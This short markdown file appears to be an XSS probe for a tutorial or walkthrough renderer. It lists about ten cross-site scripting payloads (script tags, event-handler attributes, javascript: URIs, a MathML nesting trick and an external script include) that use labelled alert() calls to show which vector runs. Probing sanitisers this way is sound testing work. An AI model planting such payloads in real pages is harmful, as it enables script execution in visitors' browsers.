# OiCS tutorial XSS probe

Benign step text.

<script>alert('SCRIPT-TAG:'+document.domain)</script>

<img src="x" onerror="alert('IMG-ONERROR:'+document.domain)">

<iframe src="javascript:alert('IFRAME-JS:'+document.domain)"></iframe>

<a href="javascript:alert('HREF-JS:'+document.domain)">jslink</a>

<div onclick="alert('ONCLICK:'+document.domain)">click-me-div</div>

<svg onload="alert('SVG-ONLOAD:'+document.domain)"></svg>

<walkthrough-spotlight-pointer spotlightId="x" onmouseover="alert('WT-ATTR:'+document.domain)"></walkthrough-spotlight-pointer>

<math><mtext><script>alert('MATHML:'+document.domain)</script></mtext></math>

<script src="https://gals-macbook-pro-2.invalid/beacon.js"></script>

<object data="javascript:alert('OBJECT:'+document.domain)"></object>
